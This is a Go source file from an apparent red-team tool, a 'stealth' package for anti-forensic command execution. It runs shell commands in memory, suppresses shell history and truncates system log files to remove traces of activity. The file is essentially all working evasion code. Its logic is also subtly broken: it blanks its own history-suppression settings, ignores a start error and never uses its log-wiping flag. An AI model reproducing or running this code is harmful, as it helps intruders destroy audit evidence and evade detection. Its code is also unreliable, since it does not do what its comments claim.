// internal/stealth/stealth.go
// Package stealth provides memory‑only command execution, history
// suppression, log wiping, and anti‑forensic measures.
// Author: Helix Red Team
// Date: 2026-05-09
package stealth

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// StealthConfig holds configurable options for stealth execution.
type StealthConfig struct {
	// MemoryOnly – if true, run the command directly via sh -c without
	// leaving any file artifact (no temp script file).
	MemoryOnly bool
	// SuppressHistory – if true, set HISTFILE to /dev/null,
	// HISTSIZE=0, and unset SHELL_SESSION_ID to prevent shell history.
	SuppressHistory bool
	// WipeLogsOnExit – if true, after execution truncate common log
	// files (requires root permissions).  Use with extreme caution.
	WipeLogsOnExit bool
	// LogFiles lists the absolute paths to truncate.
	LogFiles []string
}

// DefaultStealthConfig returns a safe‑default configuration.
func DefaultStealthConfig() StealthConfig {
	return StealthConfig{
		MemoryOnly:      true,
		SuppressHistory: true,
		WipeLogsOnExit:  false,
		LogFiles:        nil,
	}
}

// StealthExecutor wraps a shell command with stealth measures.
type StealthExecutor struct {
	config StealthConfig
}

// NewStealthExecutor creates a new executor with the given config.
func NewStealthExecutor(cfg StealthConfig) *StealthExecutor {
	return &StealthExecutor{config: cfg}
}

// Execute runs the provided shell command without leaving forensic traces.
// Returns the combined stdout+stderr output.
func (s *StealthExecutor) Execute(command string) (string, error) {
	return s.executeWithSuppression(command)
}

// executeWithSuppression runs the command via sh -c with environment
// variables that prevent the shell from recording history.
func (s *StealthExecutor) executeWithSuppression(command string) (string, error) {
	cmd := exec.Command("sh", "-c", command)

	// Build a clean environment.
	env := os.Environ()

	// Force history‑related variables to safe values.
	safeEnv := []string{
		"HISTFILE=/dev/null",
		"HISTSIZE=0",
		"HISTFILESIZE=0",
	}
	env = append(env, safeEnv...)

	// Nullify any previously set history variables so they don't override ours.
	for i, e := range env {
		if len(e) == 0 {
			continue
		}
		// Cut out variables that start with any of these prefixes.
		prefixes := []string{"HISTFILE=", "HISTSIZE=", "HISTFILESIZE=", "SAVEHIST=", "HISTIGNORE=", "HISTTIMEFORMAT="}
		for _, p := range prefixes {
			if len(e) >= len(p) && strings.HasPrefix(e, p) {
				env[i] = ""
				break
			}
		}
	}

	cmd.Env = env
	cmd.Stdin = nil

	var outBuf, errBuf strings.Builder
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	// Start and wait with a timeout.
	cmd.Start()
	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case err := <-done:
		if err != nil {
			return "", fmt.Errorf("stealth command failed: %w", err)
		}
	case <-time.After(5 * time.Minute):
		cmd.Process.Kill()
		return "", fmt.Errorf("stealth command timed out")
	}

	return outBuf.String() + errBuf.String(), nil
}

// WipeLogs truncates the configured log files. Requires adequate permissions.
func (s *StealthExecutor) WipeLogs() error {
	if len(s.config.LogFiles) == 0 {
		return nil
	}
	for _, path := range s.config.LogFiles {
		info, err := os.Stat(path)
		if err != nil {
			continue
		}
		if info.IsDir() {
			continue
		}
		f, err := os.OpenFile(path, os.O_TRUNC|os.O_WRONLY, 0)
		if err != nil {
			return fmt.Errorf("failed to wipe %s: %w", path, err)
		}
		f.Close()
	}
	return nil
}
